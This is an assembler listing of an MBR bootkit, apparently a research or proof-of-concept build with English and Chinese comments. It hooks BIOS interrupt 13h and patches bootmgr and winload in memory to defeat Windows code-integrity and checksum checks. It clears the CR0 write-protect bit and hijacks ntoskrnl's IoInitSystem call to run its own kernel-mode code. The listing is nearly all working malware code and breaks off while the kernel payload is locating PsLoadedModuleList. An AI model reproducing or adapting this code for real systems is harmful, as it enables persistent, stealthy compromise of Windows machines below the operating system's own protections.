     1                                  ; this code will be loaded in 0x7e00
     2                                  [bits 16]
     3                                  CPU 386 
     4                                  org 00h
     5                                  
     6                                  ; save all regs before execute the origin code
     7 00000000 6660                    pushad
     8                                  
     9                                  ; allocate 4096 bytes for the interrupt 13h background service
    10 00000002 BE1304                  mov si,0413h    ; using "base memory size in KB" of BIOS Data Area (0040h:0013h)
    11 00000005 832C04                  sub [si],word 4  ; 4096 bytes
    12 00000008 AD                      lodsw  ;  
    13 00000009 C1E006                  shl ax,6  ; * 1024 / 16
    14 0000000C 8EC0                    mov es,ax   ; store segment address
    15 0000000E 31FF                    xor di,di   ; offset
    16                                  
    17                                  ; now copy this boot application to the end of memory (by default 4 KB size, the reserved size)
    18 00000010 BE007E                  mov si,7e00h
    19 00000013 66B9[F0040000]          mov ecx,Total_End_of_Binary
    20 00000019 F3A4                    rep movsb
    21                                  
    22                                  ; backup old int 13h vector
    23 0000001B 66A14C00                mov eax,[13h * 4]     ; backup IVT vector 13h
    24 0000001F 2666A3[EA00]            mov [es:Forward_Interrupt_13h_Original + 1],eax   ; store the old jump address
    25                                  
    26                                  ; hook int 13h
    27 00000024 C7064C00[EE00]          mov [13h * 4],word Interrupt_13h_Hook  ; new address to jump to on "int 13h" instruction
    28 0000002A 8C064E00                mov [13h * 4 + 2],es     ; set segment to jump to on int 13h
    29                                  
    30 0000002E BE[5800]                mov si,Stage_0_Message
    31 00000031 81C6007E                add si, 7e00h
    32 00000035 E80A00                  call Print_Text
    33 00000038 E86301                  call wait_key
    34 0000003B 6661                    popad
    35                                  
    36                                  execute_origin_mbr:
    37                                  ; this will execute the origin mbr 
    38 0000003D EA007C0000              jmp 0000h:7c00h
    39                                  
    40                                  ; prints the text given in si
    41                                  Print_Text:
    42 00000042 6660                     pushad
    43 00000044 9C                      pushf
    44 00000045 BB0700                  mov bx,0007h                                    ; Page Number = 0, Attribute = 07h
    45 00000048 B40E                    mov ah,0Eh                                      ; Function 0Eh: Teletype Output
    46                                  
    47 0000004A 2EAC                    cs lodsb                                        ; load the first character
    48                                  
    49                                  Next_Char:
    50 0000004C CD10                    int 10h
    51 0000004E 2EAC                    cs lodsb                                        ; al = next character
    52 00000050 08C0                    or al,al                                        ; last letter?
    53 00000052 75F8                    jnz Next_Char                                   ; if not print next letter
    54 00000054 9D                      popf
    55 00000055 6661                    popad
    56 00000057 C3                      ret
    57                                  
    58 00000058 5E5F5F5F5F5E202070-     Stage_0_Message                 db      '^____^  press any key to continue:',13,10, 0
    58 00000061 7265737320616E7920-
    58 0000006A 6B657920746F20636F-
    58 00000073 6E74696E75653A0D0A-
    58 0000007C 00                 
    59 0000007D 426F6F746D67725F73-     Bootmgr_sign_found_Message                 db      'Bootmgr_sign_found press any key to patch SU module to gain control in protect mode:',13,10, 0
    59 00000086 69676E5F666F756E64-
    59 0000008F 20707265737320616E-
    59 00000098 79206B657920746F20-
    59 000000A1 706174636820535520-
    59 000000AA 6D6F64756C6520746F-
    59 000000B3 206761696E20636F6E-
    59 000000BC 74726F6C20696E2070-
    59 000000C5 726F74656374206D6F-
    59 000000CE 64653A0D0A00       
    60 000000D4 496E74657272757074-     Interrupt_13h_Message          db      'Interrupt_13h call',13,10, 0
    60 000000DD 5F3133682063616C6C-
    60 000000E6 0D0A00             
    61                                  
    62                                  Forward_Interrupt_13h_Original:
    63                                  ; jump to the original interrupt 13h handler (segment:offset will be patched dynamically)
    64 000000E9 EA00000000              jmp word 0000h:0000h
    65                                  
    66                                  ; now our background "service" starts, we get control only by int 13
    67                                  ; the code is now located at the end of memory (most likely 9F400h)
    68                                  ;direct declare string for print will crash because this code wille be relocate.
    69                                  Interrupt_13h_Hook:
    70                                  ; backup cpu ctx
    71 000000EE 6660                        pushad
    72 000000F0 9C                          pushf
    73 000000F1 80FC42                      cmp ah,42h                                                                      ; Extended Read?
    74 000000F4 7407                        jz read_handler
    75 000000F6 80FC02                      cmp ah,02h                                                                      ; Read?
    76 000000F9 0F859A00                    jnz exit_and_call_origin
    77                                  read_handler:
    78 000000FD BE[D400]                    mov si,Interrupt_13h_Message
    79 00000100 E83FFF                      call Print_Text
    80                                  
    81                                  ; restore cpu ctx
    82 00000103 9D                          popf
    83 00000104 6661                        popad
    84 00000106 50                          push ax; save the cmd
    85                                      ; simulate interrupt instruction
    86 00000107 9C                          pushfw
    87 00000108 0E                          push cs
    88 00000109 E8DDFF                      call word Forward_Interrupt_13h_Original
    89 0000010C 0F828100                    jc read_fail_handler
    90                                  
    91                                      ; read disk ok,   need more handle so save the result
    92 00000110 6660                        pushad ; 32
    93 00000112 9C                          pushf ; 2
    94                                  
    95 00000113 1E                          push ds  ; 2 data segment register will be modified to access this modules data
    96 00000114 06                          push es; 2
    97                                  
    98 00000115 89DF                        mov di,bx    ; di will store target buffer
    99 00000117 89E5                        mov bp,sp
   100 00000119 807E2602                    cmp byte [bp+ 38], 02h
   101 0000011D 7406                        jz Parameters_Normalized
   102 0000011F 8B4C02                      mov cx,[si+0x2]  ;get sector count
   103 00000122 C47C04                      les di,[si+0x4] ; get buffer
   104                                      Parameters_Normalized:
   105 00000125 C1E109                      shl cx,9 ; number of bytes = sector count * 512
   106 00000128 FC                          cld
   107                                  
   108                                      ; skip scan if bootmgr already patched.
   109                                      ;test [cs:Configuration_Bits],byte 00001000b 
   110                                      ;jnz bootmgr_already_patched
   111                                  
   112                                      ; now scan the read buffer for a signature in bootmgr
   113                                      ;   + 8A 46 ?? 98 3D 00 00 75 03 E9 03 00 E9 35 00
   114                                      ;     Windows Vista/7 bootmgr at address 06F2h
   115                                      ; patch applied: hooking code to call protected mode part
   116                                      ;   000205ec:  mov al, byte ptr ss:[bp+0xfff6]  ; 8a46f6    ->    call far 0020:0009f5c4    ; 669ac4f509002000
   117                                      ;   000205ef:  cbw                              ; 98        ->    
   118                                      ;   000205f0:  cmp ax, 0x0000                   ; 3d0000    ->    
   119                                      ;   000205f3:  jnz .+0x0003                     ; 7503      ->      (nop)                   ; 90
   120                                      ;   000205f5:  jmp .+0x0003                     ; e90300    ->    jmp .+0x0003              ; e90300
   121                                      ;   000205f8:  jmp .+0x0035                     ; e93500    ->    jmp .+0x0035              ; e93500
   122                                      Search_Signature_3:
   123 00000129 B08A                        mov al,8Ah
   124 0000012B F2AE                        repne scasb
   125 0000012D 755B                        jnz read_ok_handler                                                     ; if not found => exit
   126 0000012F 26803D46                    cmp byte [es:di],0x46
   127 00000133 75F4                        jnz Search_Signature_3
   128 00000135 2666817D02983D0000          cmp dword [es:di+2],00003D98h
   129 0000013E 75E9                        jnz Search_Signature_3
   130 00000140 2666817D067503E903          cmp dword [es:di+6],03E90375h
   131 00000149 75DE                        jnz Search_Signature_3
   132 0000014B 2666817D0A00E93500          cmp dword [es:di+10],0035E900h
   133 00000154 75D3                        jnz Search_Signature_3
   134                                  
   135                                      ; in win7sp1_x32 this will execute twice
   136                                      ; but in win8.1_x64 will only execute  once
   137                                      ; apply patch:
   138                                      ;   + 66 9A ADDRESS 20 90
   139                                      Found_Signature_bootmgr:
   140 00000156 2E800E[9D01]08              or [cs:Configuration_Bits],byte 00001000b 
   141 0000015C 4F                          dec di
   142 0000015D BE[7D00]                    mov si,Bootmgr_sign_found_Message
   143 00000160 E8DFFE                      call Print_Text
   144 00000163 E83800                      call wait_key
   145                                      ;jmp read_ok_handler
   146                                     ;jmp Remove_Interrupt_13h_Hook
   147                                      
   148                                      ; do patch work
   149 00000166 26C705669A                  mov word [es:di],0x9A66   ; patch something
   150 0000016B 6631C0                      xor eax,eax
   151 0000016E 8CC8                        mov ax,cs
   152 00000170 66C1E004                    shl eax,4
   153 00000174 6605[A9010000]              add eax,Entry_Point_OS_Vista
   154 0000017A 2666894502                  mov [es:di+0x2],eax 
   155 0000017F 26C745062000                mov word [es:di+0x6],0x20  
   156 00000185 26C6450890                  mov byte [es:di+0x8],0x90 
   157                                  
   158                                  ;Remove_Interrupt_13h_Hook:
   159                                      ;mov eax,[Forward_Interrupt_13h_Original+1]   ; offset of original int 13h
   160                                     ; xor bx,bx
   161                                      ;mov ds,bx
   162                                    ;  mov [13h * 4],eax               ; restore interrupt 13h vector (reset offset)
   163                                  
   164                                  bootmgr_already_patched:
   165                                  read_ok_handler:
   166 0000018A 07                      pop es   ; restore all register contents as it was before this hook
   167 0000018B 1F                      pop ds
   168 0000018C 9D                      popf
   169 0000018D 6661                    popad
   170 0000018F B400                    mov ah,0
   171                                  read_fail_handler:
   172 00000191 83C402                      add sp, 2 ; pop the cmd
   173 00000194 CA0200                      retf 2
   174                                  
   175                                  exit_and_call_origin:
   176 00000197 9D                          popf
   177 00000198 6661                        popad
   178 0000019A E94CFF                      jmp Forward_Interrupt_13h_Original
   179                                  
   180 0000019D 00                      Configuration_Bits    db  00000000b
   181                                  
   182                                  wait_key:
   183 0000019E 6660                    pushad
   184 000001A0 9C                      pushf
   185 000001A1 30E4                    xor ah,ah                                       ; Function 00h: Get Keystroke
   186 000001A3 CD16                    int 16h
   187 000001A5 9D                      popf
   188 000001A6 6661                    popad
   189 000001A8 C3                      ret
   190                                  
   191                                  ; protected code start called by bootmgr SU module
   192                                  [bits 32]
   193                                  Entry_Point_OS_Vista:
   194 000001A9 90                      nop
   195 000001AA 90                      nop
   196 000001AB 90                      nop
   197 000001AC 90                      nop
   198 000001AD 60                      pushad
   199 000001AE 06                      push es
   200 000001AF 1E                      push ds
   201                                  
   202                                  ; we need to set correct segment register (this is also why this function was far called)
   203                                  ;   cs:s=0x0020, dh=0x00cf9a00, dl=0x0000ffff, valid=1
   204                                  ;   ds:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
   205                                  ;   ss:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=7
   206                                  ;   es:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
   207                                  ;   fs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
   208                                  ;   gs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
   209                                  ;   ldtr:s=0x0000, dh=0x00008200, dl=0x0000ffff, valid=0
   210                                  ;   tr:s=0x0040, dh=0x00008b02, dl=0x48a00077, valid=1
   211                                  ;   gdtr:base=0x0001f000, limit=0x7f
   212                                  ;   idtr:base=0x0001f080, limit=0x7ff
   213 000001B0 B830000000              mov eax,0x30   ; set to 30h, Data Segment
   214 000001B5 8EC0                    mov es,ax
   215 000001B7 8ED8                    mov ds,ax
   216                                  ; scan OS Loader (32 bit executable embedded in bootmgr) for a signature
   217 000001B9 BF00004000              mov edi,00400000h   ; OS Loader base
   218 000001BE B900000F00              mov ecx,960 * 1024 
   219 000001C3 E800000000              call dword Get_Current_EIP_2
   220                                  Get_Current_EIP_2:
   221 000001C8 5E                      pop esi
   222 000001C9 81C646010000            add esi,Relocate_Me_Code - Get_Current_EIP_2
   223 000001CF E8CD000000              call dword Hook_WinloadExe
   224                                  
   225 000001D4 1F                      pop ds   ; restore them
   226 000001D5 07                      pop es
   227 000001D6 61                      popad
   228 000001D7 CB                      retf
   229                                  
   230                                  ; 加载的第一个pe 是 bootmgr.exe.mui
   231                                  FakeImgpLoadPEImage:
   232                                  ; 1. called by OSLOADER resisting in bootmgr 
   233                                  ; 2. return address is 0x4216a8
   234                                  ; 3. ebx(0x2700c0 the pe file header   )
   235 000001D8 E83F010000              call dword Obfuscation_Function
   236                                  
   237                                  ; move return eip to the "successful branch" (skip the STATUS_IMAGE_CHECKSUM_MISMATCH)
   238                                  ; _text:004216A2 3B 43 58                                cmp     eax, [ebx+58h]
   239                                  ; _text:004216A5 74 18                                   jz      short loc_4216BF
   240                                  ; C7 45 F8 21 02 00 C0    mov     [ebp+var_8], 0C0000221h ; STATUS_IMAGE_CHECKSUM_MISMATCH
   241 000001DD 0FBE4604                movsx eax,byte [esi+4] ; esi = Relocate_Me_Code, get jump offset of original code from the backup
   242 000001E1 48                      dec eax ; -1 because call [address] used 1 more byte
   243 000001E2 0144242C                add [esp+0x2c],eax ; return eip (2Ch = pushad 32 + pushfd 4  + push eax 4 + call dword Obfuscation_Function 返回地址
   244                                  ; xchg 替换成了 ebx 即 pe file header)
   245                                  
   246                                  ; why ??????????????????????????????????????
   247                                  ; get caller's eax register
   248 000001E6 8D5706                  lea edx,[edi+0x6]    ; original return address + 6 指令被截断了,需要跳过剩下的6 字节
   249 000001E9 0FB64601                movzx eax,byte [esi+0x1]  ; register (eax, 43) of compare opcode
   250 000001ED F6D0                    not al     ; = BCh
   251 000001EF 2407                    and al,00000111b        ; = 04h
   252 000001F1 0402                    add al,2        ; = 06h
   253 000001F3 8B3C84                  mov edi,[esp+eax*4]      ; stack + 6*4  =>  get ebx register..
   254                                  
   255                                  ; valid PE Image?
   256 000001F6 813F50450000            cmp dword [edi],'PE' ; verify PE Signature
   257 000001FC 751F                    jnz Exit_FakeImgpLoadPEImage
   258 000001FE 66817F180B01            cmp word [edi+0x18],010Bh  ; 010Bh, Magic Number (PE32)
   259 00000204 7517                    jnz Exit_FakeImgpLoadPEImage
   260                                  
   261                                  ; scan bootmgr.exe.mui for removing code integrity check, again (shouldn't appear anyway)
   262 00000206 8B4F50                  mov ecx,[edi+0x50]  ; SizeOfImage
   263 00000209 81E700F0FFFF            and edi,0FFFFF000h  ; page base address of PE Image
   264 0000020F E88D000000              call dword Hook_WinloadExe
   265 00000214 7407                    jz Exit_FakeImgpLoadPEImage
   266                                  
   267                                  ; find the signature in ntoskrnl and patch the code
   268 00000216 E844000000              call Find_Ntoskrnl_Code_Pattern
   269 0000021B 7405                    jz Patch_Kernel_Code_Vista   ; if found, patch!
   270                                  Exit_FakeImgpLoadPEImage:
   271 0000021D E919010000              jmp Obfuscation_Return ; return to Windows
   272                                  
   273                                  Patch_Kernel_Code_Vista:
   274                                  ; ebx = some address 
   275                                  ; ecx = size of image of nt kernel
   276                                  ; edi = nt kernel image base address
   277 00000222 90                      nop
   278 00000223 90                      nop
   279                                  ; INIT:007BF3EB E8 ED B7 FF FF                          call    _IoInitSystem@4 ; IoInitSystem(x)
   280                                  ; remember original jump address
   281 00000224 8B13                    mov edx,[ebx]  ; edx = [signature], must be some address
   282 00000226 8D541304                lea edx,[ebx+edx+4]  ; signature address + relative jump address + 4 = return address
   283 0000022A 89560A                  mov [esi+10],edx  ; store return address to temporary code (ntkernel_Hook_Address)
   284                                  
   285 0000022D 81C700080000            add edi,2048  
   286 00000233 EB00                    jmp Patch_Kernel_Code
   287                                  
   288                                  ; patch the NT Kernel with Kernel Code  =)
   289                                  Patch_Kernel_Code:
   290 00000235 81C7FF0F0000            add edi,00000FFFh  ; get end of page
   291 0000023B 81E700F0FFFF            and edi,0FFFFF000h  ; page base address
   292 00000241 81EF00080000            sub edi,2048;
   293 00000247 B9E2010000              mov ecx,Total_End_of_Binary - Relocate_Me_Code  ; size of further code
   294 0000024C 57                      push edi
   295 0000024D F3A4                    rep movsb
   296 0000024F 5F                      pop edi
   297                                  
   298 00000250 83C735                  add edi,Ntoskrnl_Hook_Code - Relocate_Me_Code   ; -> absolute Kernel Code entry point address
   299 00000253 29DF                    sub edi,ebx    ; - address of call
   300 00000255 83EF04                  sub edi,4  ; -4 because of call instruction, relative call
   301 00000258 893B                    mov [ebx],edi    ; store address
   302 0000025A E9DC000000              jmp dword Obfuscation_Return
   303                                  
   304                                  Find_Ntoskrnl_Code_Pattern:
   305                                  ; Phase1InitializationDiscard
   306                                  ; INIT:007BF3E0 6A 19                                   push    19h
   307                                  ; INIT:007BF3E2 6A 4B                                   push    4Bh
   308                                  ; INIT:007BF3E4 58                                      pop     eax
   309                                  ; INIT:007BF3E5 E8 C4 6D C4 FF                          call    _InbvSetProgressBarSubset@8 ; InbvSetProgressBarSubset(x,x)
   310                                  ; INIT:007BF3EA 56                                      push    esi             ; NewIrql
   311                                  ; INIT:007BF3EB E8 ED B7 FF FF                          call    _IoInitSystem@4 ; IoInitSystem(x)
   312                                  ; INIT:007BF3F0 84 C0                                   test    al, al
   313                                  ; INIT:007BF3F2 75 07                                   jnz     short loc_7BF3FB
   314                                  ; Input
   315                                  ;   ecx = SizeOfImage
   316                                  ;   edi = Image
   317                                  ; return value ebx = pointer to code pattern with startin code E8 (= relative call opcode)
   318                                  ; return status zero flag = 1 found
   319 0000025F 51                      push ecx
   320 00000260 57                      push edi
   321                                  
   322                                  ; scan ntoskrnl.exe for code patterns [+ for Vista]:
   323                                  ;   +  6A 4B 6A 19 / 6A 19 6A 4B
   324                                  ;     ntoskrnl.1CE87E0h
   325                                  ;			memory.0x80683ec9
   326                                  Scan_Pattern_Ntoskrnl:
   327 00000261 B06A                    mov al,0x6a
   328 00000263 F2AE                    repne scasb
   329 00000265 7537                    jnz Find_Ntoskrnl_Code_Pattern_Exit
   330 00000267 817FFF6A4B6A19          cmp dword [edi-0x1],0x196A4B6A
   331 0000026E 740A                    jz Signature_1_Found
   332 00000270 817FFF6A196A4B          cmp dword [edi-0x1],0x4B6A196A
   333 00000277 75E8                    jnz Scan_Pattern_Ntoskrnl  ; if not equal => continue search
   334 00000279 47                      inc edi   ; weird signature
   335                                  Signature_1_Found:
   336 0000027A 807F0389                cmp byte [edi+0x3],0x89    ; 2 possible valid signatures
   337 0000027E 7503                    jnz No_Extended_Signature
   338 00000280 83C706                  add edi,byte +0x6
   339                                  No_Extended_Signature:
   340 00000283 807F03E8                cmp byte [edi+0x3],0xe8
   341 00000287 75D8                    jnz Scan_Pattern_Ntoskrnl
   342                                  
   343                                  ; first pattern found, scan for next [same as in previous Sinowal version] signature:
   344                                  ;   + E8 ?? ?? ?? ?? 84 C0
   345                                  ;     ntoskrnl.1CE87F3h						ntoskrnl.1CE87F8h
   346                                  ;			memory.0x80683ed8						memory.0x80683EDD
   347 00000289 8D5F08                  lea ebx,[edi+0x8]
   348 0000028C 87DF                    xchg ebx,edi
   349 0000028E B0E8                    mov al,0xe8
   350 00000290 F2AE                    repne scasb
   351 00000292 750A                    jnz Find_Ntoskrnl_Code_Pattern_Exit
   352 00000294 66817F0484C0            cmp word [edi+0x4],0xc084
   353 0000029A 87DF                    xchg ebx,edi
   354 0000029C 75C3                    jnz Scan_Pattern_Ntoskrnl
   355                                  
   356                                  Find_Ntoskrnl_Code_Pattern_Exit:
   357 0000029E 5F                      pop edi
   358 0000029F 59                      pop ecx
   359 000002A0 C3                      ret
   360                                  
   361                                  Hook_WinloadExe:
   362                                  ; Input
   363                                  ;   esi = address of Relocate_Me_Code
   364                                  ;   edi = address of memory to scan
   365                                  ;   ecx = bytes to scan
   366                                  ; Output
   367                                  ; zf  0 if bootmgr.exe bootmgr.exe.mui   winload.exe has been succssful patched.
   368 000002A1 51                      push ecx
   369 000002A2 57                      push edi
   370                                  
   371                                  ; scan bootmgr!bootmgr.exe for _ImgArchPcatLoadBootApplication@28
   372                                  ; _text:0041C016 E8 EB 54 00 00                          call    _ImgArchPcatLoadBootApplication@28 ; ImgArchPcatLoadBootApplication(x,x,x,x,x,x,x)
   373                                  ; _text:0041C01B 8B F0                                   mov     esi, eax
   374                                  ; _text:0041C01D                         ; 110:       if ( v9 < 0 )
   375                                  ; _text:0041C01D 85 F6                                   test    esi, esi
   376                                  ; _text:0041C01F 0F 88 86 01 00 00                       js      loc_41C1AB
   377                                  ; _text:0041C025                         ; 115:       v4 = v30;
   378                                  ; _text:0041C025 83 3D 8C 44 4B 00 00                    cmp     _BdDebugTransitions, 0
   379                                  ; _text:0041C02C 8B 7C 24 1C                             mov     edi, [esp+0D0h+var_B4]
   380                                  
   381                                  ; 8B F0 85 F6 0F 88 ?? ?? ?? ?? 83 3D ?? ?? ?? ?? ?? 8B
   382                                  
   383                                  Search_Unknown_Signature:
   384 000002A3 B08B                    mov al,0x8B
   385 000002A5 F2AE                    repne scasb
   386 000002A7 7562                    jnz Hook_WinloadExe_Exit
   387 000002A9 817FFF8BF085F6          cmp dword [edi-0x1],0xF685F08B
   388 000002B0 75F1                    jnz Search_Unknown_Signature
   389 000002B2 66817F030F88            cmp word [edi+0x3],0x880F
   390 000002B8 75E9                    jnz Search_Unknown_Signature
   391 000002BA 66817F09833D            cmp word [edi+0x9],0x3D83
   392 000002C0 75E1                    jnz Search_Unknown_Signature
   393 000002C2 807F108B                cmp byte [edi+0x10],0x8B
   394 000002C6 75DB                    jnz Search_Unknown_Signature
   395                                  
   396                                  ; backup 6 bytes to overwrite them with custom code
   397                                  ; break in 0x9edf5
   398 000002C8 4F                      dec edi                                                                         ; -1 to get to start of signature
   399 000002C9 8B07                    mov eax,[edi]                                                                   ; copy 4 bytes
   400 000002CB 8906                    mov [esi],eax
   401 000002CD 668B4704                mov ax,[edi+4]                                                                  ; copy 2 bytes
   402 000002D1 66894604                mov [esi+4],ax
   403                                  
   404                                  ; store new code: FF 15 + address  (call hook)
   405 000002D5 66B8FF15                mov ax,0x15FF  ; FF 15, opcodes of call [address]
   406 000002D9 66AB                    stosw          
   407 000002DB 8D86CAFEFFFF            lea eax,[esi - (Relocate_Me_Code - FakeImgpLoadPEImage)]   ; get offset of hook code
   408 000002E1 26894606                mov [es:esi+6],eax ; set the Hook_Address variable
   409 000002E5 8D4606                  lea eax,[esi+6]   ; get address of variable address, used for call [address]
   410 000002E8 AB                      stosd 
   411                                  
   412                                  ; restore (and store) register contents for searching the next signature
   413 000002E9 5F                      pop edi
   414 000002EA 59                      pop ecx
   415 000002EB 51                      push ecx
   416 000002EC 57                      push edi
   417                                  
   418                                  ; scan winload for the code that puts ntoskrnl corrupt error status
   419                                  ;   + 8B F0 85 F6 75   and value 0C0000098h
   420                                  ; 8B F0 85 F6 75 ?? ?? 980000c0
   421                                  ; patch applied: STATUS_FILE_INVALID error code will be overwritten
   422                                  ;   0041f076:  lock test esi, esi        ; f085f6
   423                                  ;   0041f079:  jnz .+0x0000000a          ; 750a
   424                                  ;   0041f07b:  mov eax, 0xc0000098       ; b8980000c0   ->    mov eax,0
   425                                  Search_Ntoskrnl_Error_Code:
   426 000002ED B08B                    mov al,0x8b
   427 000002EF F2AE                    repne scasb
   428 000002F1 7518                    jnz Hook_WinloadExe_Exit
   429 000002F3 813FF085F675            cmp dword [edi],0x75f685F0
   430 000002F9 75F2                    jnz Search_Ntoskrnl_Error_Code
   431 000002FB 817F06980000C0          cmp dword [edi+0x6],0xC0000098  ; ntoskrnl.exe missing or corrupt (Error 0xC0000098), STATUS_FILE_INVALID
   432 00000302 75E9                    jnz Search_Ntoskrnl_Error_Code
   433 00000304 C7470600000000          mov dword [edi+0x6],0x0      ;  set ret value to  STATUS_SUCCESS
   434                                  
   435                                  Hook_WinloadExe_Exit:
   436 0000030B 5F                      pop edi
   437 0000030C 59                      pop ecx
   438 0000030D C3                      ret
   439                                  
   440                                  Relocate_Me_Code:
   441 0000030E 90                      nop
   442 0000030F 90                      nop
   443 00000310 90                      nop
   444 00000311 90                      nop
   445 00000312 90                      nop
   446 00000313 90                      nop
   447 00000314 00000000                Hook_Address    dd  0
   448 00000318 00000000                ntkernel_Hook_Address    dd  0
   449                                  
   450                                  Obfuscation_Function:
   451                                  ; [stack + 0] = address to jump to
   452                                  ; [stack + 4] = passed further in edi  -> return address to Windows / Argument 2
   453                                  
   454                                  ; Output:
   455                                  ; esi = pointer to Relocate_Me_Code
   456                                  ; edi = pointer to return code of Windows / Argument 2
   457                                  
   458                                  ; during execution all memory access is possible is cr0.wp cleared
   459                                  ; return by jumping to Obfuscation_Return
   460                                  
   461 0000031C 60                      pushad   ; +32
   462 0000031D 9C                      pushfd     ; +4
   463 0000031E FC                      cld
   464                                  
   465                                  ; clear cr0.Write Protect flag (to allow writing into read-only user pages)
   466 0000031F 0F20C0                  mov eax,cr0
   467 00000322 50                      push eax ; +4
   468 00000323 25FFFFFEFF              and eax,0FFFEFFFFh ; clear cr0.WP (bit 16), it is normally set in Windows
   469                                  
   470                                  ; set parameters and call
   471                                  ; the pe file header
   472 00000328 875C2428                xchg ebx,[esp+0x28]   ; ebx = return eip  
   473 0000032C 8B7C242C                mov edi,[esp+0x2c]   ; edi = return address to Windows /Argument 2
   474 00000330 E800000000              call dword Get_Current_EIP_0
   475                                  Get_Current_EIP_0:
   476 00000335 5E                      pop esi ; esi = eip
   477 00000336 83EE27                  sub esi,Get_Current_EIP_0 - Relocate_Me_Code   ; set esi to Relocate_Me_Code absolute address
   478 00000339 FFE3                    jmp ebx   ; jump
   479                                  
   480                                  ; restore cr0.wp
   481                                  Obfuscation_Return:
   482 0000033B 58                      pop eax
   483 0000033C 0F22C0                  mov cr0,eax   ; everything done fine, restore it and give control back to Windows
   484                                  
   485 0000033F 9D                      popfd
   486 00000340 61                      popad
   487 00000341 5B                      pop ebx ; exchange the value back
   488 00000342 C3                      ret   
   489                                  
   490                                  Ntoskrnl_Hook_Code:
   491 00000343 90                      nop
   492 00000344 90                      nop
   493 00000345 90                      nop
   494 00000346 FF742404                push dword [esp+0x4]   ; store argument 1 = 0x80087000, from nt!IoInitSystem
   495 0000034A 50                      push eax    ; first call = Execute_Kernel_Code  被 mov [esp+0x30],eax覆盖成 Execute_Kernel_Code 地址
   496 0000034B 50                      push eax     ; second call = call to original address 被 mov [esp+0x2c],eax 覆盖成 _IoInitSystem@4 地址
   497                                  ; Obfuscation_Return 的最后一条返回指令ret执行 esp 指向 这里, 所以会运行到 _IoInitSystem@4
   498                                  ; _IoInitSystem@4 运行完返回 Execute_Kernel_Code
   499 0000034C E8CBFFFFFF              call dword Obfuscation_Function
   500                                  
   501                                  ; set return obfuscation address to original address that was overwritten (forward the function)
   502 00000351 8B460A                  mov eax,[esi+10]  ; esi = original calling address (that was overwritten by applied patch), PMwPC_Address
   503                                  ; eax == _IoInitSystem@4
   504 00000354 8944242C                mov [esp+0x2c],eax  ; set return pointer (using the obfuscation return) to the original calling address
   505                                  
   506                                  ; remove hook by reassigning jump address
   507 00000358 8B7C2438                mov edi,[esp+0x38] ; edi => return eip from this hook call
   508                                  ; edi == call    _IoInitSystem@4 的下一条指令
   509 0000035C 29F8                    sub eax,edi    ; original calling address - return eip to code (calculate relative original calling address)
   510                                  ;  此处是还原 原来的patch
   511 0000035E 368947FC                mov [ss:edi-4],eax       ; for every next call: do not call this bootkit
   512                                  
   513                                  ; set return eip of the forwarded function to Execute_Kernel_Code
   514 00000362 8D465D                  lea eax,[esi + Execute_Kernel_Code - Relocate_Me_Code]  ; get address of Execute_Kernel_Code
   515 00000365 89442430                mov [esp+0x30],eax      ; and store it as return eip address
   516 00000369 EBD0                    jmp short Obfuscation_Return
   517                                  
   518                                  Execute_Kernel_Code:
   519                                  
   520                                  ; execute the Kernel Code (original hooked/forwarded initialization function returns here)
   521 0000036B E80A000000              call Kernel_Code   ; =)
   522 00000370 90                      nop
   523 00000371 90                      nop
   524 00000372 90                      nop
   525 00000373 90                      nop
   526 00000374 90                      nop
   527 00000375 90                      nop
   528 00000376 90                      nop
   529 00000377 C20400                  ret 4      ; remove the pushed argument (as the original function would have done)
   530                                  
   531                                  Kernel_Code:
   532 0000037A 60                      pushad
   533 0000037B 9C                      pushfd
   534 0000037C FC                      cld
   535                                  
   536                                  ; set ds/es/ss back again to valid Data Segment Selectors
   537 0000037D 31C0                    xor eax,eax 
   538                                  Segmentation_Check_loop:
   539 0000037F 0F03D8                  lsl ebx,ax   ; load segment limit into ebx
   540 00000382 750E                    jnz Next_Segment_Selector ; if invalid or cannot be accessed ZF = 0, next segment selector
   541 00000384 43                      inc ebx  ; +1 to get real value (normaly 0FFFFFFFFh)
   542 00000385 750B                    jnz Next_Segment_Selector     ; => if not max. (4 GB), next segment selector   (FFF..FF+1 = 0, so zero flag set if max.)
   543                                  
   544 00000387 0F02D8                  lar ebx,ax  ; load access rights into ebx
   545 0000038A 80E7FA                  and bh,11111010b   ; mask out following bits: Present, DPL, System, Type [Data/Code, Write]
   546 0000038D 80FF92                  cmp bh,10010010b     ; present? system? data? write access?
   547 00000390 7406                    je Found_Data_Segment_Selector        ;   => if yes found our Segment Selector to set
   548                                  
   549                                  Next_Segment_Selector:
   550 00000392 6683E808                sub ax,00001000b   ; next segment selector
   551 00000396 75E7                    jnz Segmentation_Check_loop    ; try next if not already the last one
   552                                  
   553                                  Found_Data_Segment_Selector:
   554                                  ; set data segment registers to data segment selectors 
   555                                  ; [usually segment selector 10h on Windows systems, which is usually ss]
   556                                  ; 0x10 r0 32bit data
   557 00000398 8EC0                    mov es,ax
   558 0000039A 8ED8                    mov ds,ax
   559                                  ;mov ss,ax  ; <- ss must be same CPL as CS (!), crashes under VirtualBox
   560                                  CPU 486     ; for the wbinvd instruction
   561 0000039C 0F09                    wbinvd
   562                                  
   563                                  ; ebp Analysis:
   564                                  ;   ebp = original esp after all operations
   565                                  ;   [ebp - 4]    ZwReadFile
   566                                  ;   [ebp - 8]    ZwCreateFile
   567                                  ;   [ebp - 12]   ZwClose
   568                                  ;   [ebp - 16]   KeLoaderBlock
   569                                  ;   [ebp - 20]   ExFrePool
   570                                  ;   [ebp - 24]   ExAllocatePool
   571                                  ;   [ebp - 28]   PsLoadedModuleList
   572                                  ;   esp points here (esp = ebp)
   573                                  ;   [esp]        pointer to data below
   574 0000039E 83EC22                  sub esp,byte 34     ; create data frame on stack (later used with ebp)
   575                                  ; let's get PsLoadedModuleList
   576                                  ;  1. get IDT base
   577                                  ;  2. get address of Division by Zero (Interrupt 0) Exception Handler
   578                                  ;  3. scan memory for PE image, should be ntoskrnl then
   579                                  ;  4. scan code of ntoskrnl for a signature and extract PsLoadedModuleList pointer
   580                                  
   581                                  ; store IDTR on stack
   582 000003A1 3E0F010C24              sidt [ds:esp]   ; store IDT Register on stack (32 bit address, 16 bit limit)
   583 000003A6 665B                    pop bx   ; 16 bit IDT limit
   584 000003A8 5B                      pop ebx     ; 32 bit IDT address
